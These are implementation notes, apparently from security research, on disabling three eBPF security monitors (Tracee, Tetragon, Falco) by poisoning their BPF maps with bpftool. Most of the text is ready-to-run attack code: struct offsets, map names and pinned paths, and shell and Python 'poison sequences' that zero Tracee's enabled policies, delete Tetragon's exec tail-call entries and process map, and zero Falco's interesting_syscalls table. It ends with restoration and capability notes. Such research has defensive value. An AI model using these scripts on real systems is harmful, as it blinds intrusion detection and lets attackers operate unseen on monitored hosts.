# Implementation Notes

## 1. Attack Implementation Overview

Each attack follows the same three-stage pattern:
1. **Locate** the target BPF map (enumeration or pinned path)
2. **Read** the current map contents (for struct-aware modification)
3. **Write** poisoned values to security-critical fields

All attacks use `bpftool` as the write mechanism, which internally calls `bpf(BPF_MAP_UPDATE_ELEM)` or `bpf(BPF_MAP_DELETE_ELEM)`. The same operations can be performed programmatically via libbpf or raw syscalls.

---

## 2. Tracee v0.24.1 Attack

### 2.1 Target Map

- **Name:** `config_map`
- **Type:** `BPF_MAP_TYPE_ARRAY`
- **Map ID:** Dynamically assigned (discovered via `bpf(BPF_MAP_GET_NEXT_ID)`)
- **Key size:** 4 bytes (`u32`, always key=0 for single-entry array)
- **Value size:** 256 bytes (`config_entry_t`)
- **Max entries:** 1

### 2.2 Struct Layout: `config_entry_t`

Reconstructed from `pkg/ebpf/c/types.h` (Tracee v0.24.1):

```
config_entry_t (256 bytes total):
+--------+------+----------------------------------+
| Offset | Size | Field                            |
+--------+------+----------------------------------+
|   0    |  4   | tracee_pid (u32)                 |
|   4    |  4   | host_pid_ns (u32)                |
|   8    |  4   | options (u32)                    |
|  12    |  2   | padding                          |
|  14    |  2   | policies_version (u16)           |
|  16    |  8   | cgroup_id_filter_enabled (u64)   |
|  24    |  ...  | [cgroup filters, 192 bytes]     |
| 216    |  8   | enabled_policies (u64)           |
| 224    | 32   | [remaining fields]               |
+--------+------+----------------------------------+
```

The `policies_config_t` sub-struct starting at offset 216:

```
policies_config_t:
+--------+------+----------------------------------+
| Offset | Size | Field                            |
| (abs)  |      |                                  |
+--------+------+----------------------------------+
| 216    |  8   | enabled_policies (u64)           |
|        |      | Bitmask: bit N = policy N active  |
|        |      | 0 = all policies disabled         |
+--------+------+----------------------------------+
```

### 2.3 Critical Code Path

In `match_scope_filters()`:
```c
res &= policies_cfg->enabled_policies;
return res;
```

The return value `res` is a bitmask of policies that matched the event scope. If `enabled_policies` is 0, then `res & 0 == 0` regardless of which policies matched. A return value of 0 causes the caller to skip event emission entirely.

### 2.4 Per-CPU Cache Invalidation

Tracee caches configuration per-CPU to avoid repeated map lookups. The cache is keyed by `policies_version`:

```c
if (cached_version != config->policies_version) {
    cached_config = *config;
    cached_version = config->policies_version;
}
```

Simply writing `enabled_policies = 0` without bumping `policies_version` will NOT take effect until the cache expires naturally (which may never happen for idle CPUs). The version bump forces immediate re-read on all CPUs.

### 2.5 Poison Sequence

```bash
# Step 1: Find config_map ID
MAP_ID=$(bpftool map list -j | python3 -c "
import json, sys
maps = json.load(sys.stdin)
for m in maps:
    if m.get('name') == 'config_map' and m['type'] == 'array':
        print(m['id']); sys.exit(0)
sys.exit(1)")

# Step 2: Read current value, zero enabled_policies, bump version
bpftool map dump id $MAP_ID -j | python3 -c "
import json, sys, subprocess
data = json.load(sys.stdin)
val = data[0]['value']
val_ints = [int(v, 16) if isinstance(v, str) else v for v in val]

# Read current version
current_version = int.from_bytes(bytes(val_ints[14:16]), 'little')

# Zero enabled_policies (offset 216-223, u64 little-endian)
for i in range(216, 224):
    val_ints[i] = 0

# Bump policies_version (offset 14-15, u16 little-endian)
new_version = current_version + 1
val_ints[14] = new_version & 0xFF
val_ints[15] = (new_version >> 8) & 0xFF

hex_val = ' '.join(f'{b:02x}' for b in val_ints)
cmd = f'bpftool map update id $MAP_ID key hex 00 00 00 00 value hex {hex_val}'
subprocess.run(cmd, shell=True, check=True)
"
```

### 2.6 Bytes Modified

- **Offset 14-15:** `policies_version` bumped by 1 (2 bytes)
- **Offset 216-223:** `enabled_policies` set to 0x0000000000000000 (8 bytes)
- **Total:** 10 bytes changed in a 256-byte value

### 2.7 Restoration

Reverse the operation: set `enabled_policies = 1` (re-enable default policy) and restore original `policies_version`. Events resume immediately as BPF programs re-read the restored config via the version check.

---

## 3. Tetragon v1.4.0 Attack

### 3.1 Target Maps

**Map 1: `execve_calls`**
- **Type:** `BPF_MAP_TYPE_PROG_ARRAY`
- **Pinned path:** `/sys/fs/bpf/tetragon/__base__/event_execve/execve_calls`
- **Max entries:** 2 (indices 0 and 1)
- **Key size:** 4 bytes (`u32`)
- **Value:** BPF program file descriptors (managed by kernel)

**Map 2: `execve_map`**
- **Type:** `BPF_MAP_TYPE_HASH`
- **Pinned path:** `/sys/fs/bpf/tetragon/execve_map`
- **Max entries:** 32768
- **Key size:** 4 bytes (`u32` = PID)
- **Value size:** 888 bytes (`msg_execve_key` + associated data)

### 3.2 Struct Layout: `execve_map` Value

Reconstructed from `bpf/process/types/basic.h`:

```
msg_execve_key (partial, key fields):
+--------+------+----------------------------------+
| Offset | Size | Field                            |
+--------+------+----------------------------------+
|   0    |  4   | pid (u32)                        |
|   4    |  4   | pad (u32)                        |
|   8    |  8   | ktime (u64)                      |
|  16    | ...  | [exec info, binary path, args]   |
| ...    | ...  | [parent info, capabilities]      |
+--------+------+----------------------------------+
Total value size: 888 bytes
```

### 3.3 Attack Vector 1: PROG_ARRAY Deletion

Tetragon's exec event pipeline uses tail calls:
```c
// In sched_process_exec tracepoint handler:
bpf_tail_call(ctx, &execve_calls, 0);  // Dispatch to exec handler stage 0
return 0;  // Reached only if tail call fails
```

Per BPF specification (kernel documentation, `include/uapi/linux/bpf.h`):
> If the call succeeds, the kernel immediately runs the program referenced. If the call fails (e.g., the index doesn't exist), the instruction is a no-op.

Deleting the entry at index 0 from `execve_calls` causes the tail call to silently fail. The entry program falls through to `return 0`, and no exec event is generated.

### 3.4 Attack Vector 2: Process State Deletion

All Tetragon sensors look up `execve_map[pid]` to retrieve process context (binary path, parent PID, start time, capabilities). If the lookup returns NULL, sensors cannot attribute the event to a process and typically drop it.

Clearing all entries from `execve_map` makes every process "unknown" to Tetragon. Combined with the `execve_calls` deletion (which prevents new entries from being created), this achieves total blindness.

### 3.5 Poison Sequence

```bash
# Attack 1: Delete PROG_ARRAY entries (breaks exec tail call chain)
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
    key hex 00 00 00 00
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
    key hex 01 00 00 00

# Attack 2: Clear all execve_map entries (remove all process context)
bpftool map dump pinned /sys/fs/bpf/tetragon/execve_map -j | python3 -c "
import json, sys, subprocess
data = json.load(sys.stdin)
for entry in data:
    key = entry.get('key', [])
    key_hex = ' '.join(
        (v.replace('0x','') if isinstance(v, str) else f'{v:02x}')
        for v in key
    )
    subprocess.run(
        f'bpftool map delete pinned /sys/fs/bpf/tetragon/execve_map key hex {key_hex}',
        shell=True, capture_output=True
    )
"
```

### 3.6 Pinned Path Advantage

Tetragon's map pinning eliminates the need for map enumeration. The attacker does not need to call `bpf(BPF_MAP_GET_NEXT_ID)` -- the paths are deterministic:
- `/sys/fs/bpf/tetragon/execve_map`
- `/sys/fs/bpf/tetragon/__base__/event_execve/execve_calls`
- `/sys/fs/bpf/tetragon/__base__/event_exit/exit_calls`
- Additional per-sensor paths under `/sys/fs/bpf/tetragon/`

### 3.7 Restoration

Tetragon cannot recover from PROG_ARRAY deletion without restarting. The daemon does not periodically re-populate tail call targets. Container restart (`docker restart`) forces full re-initialization of all maps and programs.

---

## 4. Falco (Latest, libs driver) Attack

### 4.1 Target Map

- **Name:** `interesting_syscalls`
- **Type:** `BPF_MAP_TYPE_ARRAY`
- **Map ID:** Dynamically assigned (enumerable via `BPF_MAP_GET_NEXT_ID`)
- **Key size:** 4 bytes (`u32` = syscall number)
- **Value size:** 1 byte (`u8`)
- **Max entries:** 512 (`SYSCALL_TABLE_SIZE`)
- **Not pinned** (no bpffs path)

### 4.2 Map Semantics

Each entry maps a syscall number (0-511) to an "interesting" flag:
- `interesting_syscalls[NR] = 1` : BPF probe processes events for syscall NR
- `interesting_syscalls[NR] = 0` : BPF probe returns immediately, no event generated

Falco's userspace populates this at startup based on loaded rules. Syscalls referenced by any active rule are marked as interesting. Common interesting syscalls include:

| NR  | Syscall     | Typical Falco Rules                      |
|-----|-------------|------------------------------------------|
| 59  | execve      | Process execution monitoring             |
| 322 | execveat    | Process execution monitoring             |
| 257 | openat      | File access monitoring                   |
| 56  | clone       | Process/thread creation                  |
| 41  | socket      | Network connection monitoring            |
| 42  | connect     | Network connection monitoring            |
| 2   | open        | File access monitoring                   |
| 87  | unlink      | File deletion monitoring                 |
| 90  | chmod       | Permission change monitoring             |
| 263 | unlinkat    | File deletion monitoring                 |

### 4.3 Critical Code Path

In the BPF probe entry point (`driver/bpf/probe.c` in falcosecurity/libs):
```c
u8 *is_interesting = bpf_map_lookup_elem(&interesting_syscalls, &id);
if (!is_interesting || *is_interesting == 0)
    return 0;
```

This check occurs at the very beginning of syscall processing. Setting `*is_interesting = 0` for a given syscall number causes the BPF probe to return before any event data is collected or transmitted.

### 4.4 Poison Sequence

```bash
# Find the map ID
MAP_ID=$(bpftool map list -j | python3 -c "
import json, sys
maps = json.load(sys.stdin)
for m in maps:
    if 'interesting_sys' in m.get('name','') and m['type'] == 'array':
        print(m['id']); sys.exit(0)
sys.exit(1)")

# Zero all 512 entries
for i in $(seq 0 511); do
    KEY=$(printf '%02x %02x %02x %02x' $((i & 0xff)) $(((i >> 8) & 0xff)) 0 0)
    bpftool map update id $MAP_ID key hex $KEY value hex 00
done
```

Or more efficiently via Python:
```python
import subprocess
for i in range(512):
    key = f'{i & 0xff:02x} {(i >> 8) & 0xff:02x} 00 00'
    subprocess.run(
        f'bpftool map update id {MAP_ID} key hex {key} value hex 00',
        shell=True, capture_output=True
    )
```

### 4.5 Map Discovery Without Pinning

Falco does not pin its maps to bpffs. Discovery requires enumeration:

```bash
bpftool map list -j | python3 -c "
import json, sys
for m in json.load(sys.stdin):
    if 'interesting_sys' in m.get('name',''):
        print(f\"ID={m['id']} name={m['name']} type={m['type']} entries={m['max_entries']}\")
"
```

The map name `interesting_syscalls` (or a truncated variant due to BPF's 16-character name limit: `interesting_sys`) is sufficient for identification. Combined with type=ARRAY and max_entries=512, the map is unambiguously identifiable.

### 4.6 Restoration

Falco does not re-populate `interesting_syscalls` at runtime. Restart is required:
```bash
docker restart falco-container
```
On restart, Falco re-evaluates loaded rules and re-populates the map from scratch.

---

## 5. bpftool Command Reference

### Map enumeration
```bash
bpftool map list                          # List all maps (text)
bpftool map list -j                       # List all maps (JSON)
bpftool map show id <ID>                  # Show single map info
bpftool map show pinned <PATH>            # Show pinned map info
```

### Map read
```bash
bpftool map dump id <ID>                  # Dump all entries
bpftool map dump id <ID> -j               # Dump as JSON
bpftool map dump pinned <PATH> -j         # Dump pinned map
bpftool map lookup id <ID> key hex <K>    # Single entry lookup
```

### Map write
```bash
bpftool map update id <ID> key hex <K> value hex <V>
bpftool map update pinned <PATH> key hex <K> value hex <V>
```

### Map delete (HASH/PROG_ARRAY only; ARRAY entries cannot be deleted)
```bash
bpftool map delete id <ID> key hex <K>
bpftool map delete pinned <PATH> key hex <K>
```

### Program listing (for correlating maps to programs)
```bash
bpftool prog list                         # List all loaded programs
bpftool prog show id <ID>                 # Show program details + map_ids
```

---

## 6. Capability Requirements

All operations require `CAP_BPF` (kernel 5.8+). On older kernels, `CAP_SYS_ADMIN` is required.

Verification:
```bash
# Check if current process has CAP_BPF
capsh --print | grep bpf

# Check kernel version for CAP_BPF support
uname -r  # >= 5.8

# Minimum capability set for all three attacks:
# CAP_BPF (map enumeration, read, write, delete)
# CAP_PERFMON may also be needed for some bpftool operations
```

On the test system (kernel 6.8.0-111-generic), `CAP_BPF` alone is sufficient for all map operations used in these attacks.
